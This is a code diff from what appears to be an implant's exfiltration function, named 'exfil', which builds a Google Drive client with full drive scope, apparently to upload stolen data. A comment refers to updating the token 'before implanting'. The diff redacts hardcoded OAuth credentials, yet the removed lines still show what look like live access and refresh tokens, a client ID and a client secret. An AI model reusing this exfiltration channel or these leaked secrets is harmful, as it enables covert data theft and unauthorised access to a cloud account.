@@ -153,11 +153,11 @@ def exfil(info: bytes,file_name: str):
     }
 
     #The updated token is currently hardcoded and needs to be manually updated before implanting
-    creds = Credentials(token = "ya29.a0AWY7CknPxRAFyE-R4pknsi1M6YzhBINmJuvB89kEltfIXXX3vHl9pcJOD9oXaLPFyr5OQQFlmXxp4CG_Fbw2BZ6zZptxQpzsiKXi5rkXR79zec1uiqvrngo53IQ6kcw03_8dqBNwSm_36A8aJovl67FWy9goaCgYKATISARISFQG1tDrpDwbHxmEsF8JJqoB5Zo0LlA0163", 
-        refresh_token = "1//01nK0a4Vv6x6fCgYIARAAGAESNwF-L9IrPV4hZpa8Ps5kYiE91m3E5i-IcEQPXV4EmSJw2JPHsitIZkypEoSzHWNOAH8kYxPrDjQ", 
+    creds = Credentials(token = "Removed to prevent leak while public", 
+        refresh_token = "Removed to prevent leak while public", 
         token_uri = "https://oauth2.googleapis.com/token", 
-        client_id = "12449451132-vlbs71mmjm4ra0o2gbkm2gtt38vcuavj.apps.googleusercontent.com", 
-        client_secret ="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", 
+        client_id = "Removed to prevent leak while public", 
+        client_secret ="Removed to prevent leak while public", 
         scopes = ["https://www.googleapis.com/auth/drive"])
     
     service = build('drive', 'v3', credentials=creds)
